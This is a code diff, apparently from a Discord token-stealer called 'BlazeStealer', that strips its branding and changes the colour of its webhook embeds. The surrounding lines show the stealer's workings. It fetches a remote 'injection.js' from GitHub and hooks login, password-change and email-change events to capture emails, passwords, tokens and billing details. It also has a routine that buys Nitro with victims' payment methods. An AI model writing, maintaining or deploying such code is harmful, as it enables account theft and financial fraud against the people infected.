@@ -10,9 +10,7 @@ const config = {
   auto_buy_nitro: false,
   ping_on_run: false,
   ping_val: '@everyone',
-  embed_name: 'ThanksForUsingBlazeStaler', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/999027404506935388/1000540107251654707/BlazeLeaks.png',
-  embed_color: 13828649,
+  embed_color: 3553599,
   injection_url: 'https://raw.githubusercontent.com/Jqnvier/BlazeStealer/main/injection.js',
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
@@ -644,8 +642,6 @@ const login = async (email, password, token) => {
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
   const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
     embeds: [
       {
         color: config.embed_color,
@@ -701,8 +697,6 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
   const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
     embeds: [
       {
         color: config.embed_color,
@@ -763,8 +757,6 @@ const emailChanged = async (email, password, token) => {
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
   const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
     embeds: [
       {
         color: config.embed_color,
@@ -821,9 +813,7 @@ const nitroBought = async (token) => {
   const billing = await getBilling(token);
   const code = await buyNitro(token);
   const content = {
-    username: config.embed_name,
     content: code,
-    avatar_url: config.embed_icon,
     embeds: [
       {
         color: config.embed_color,
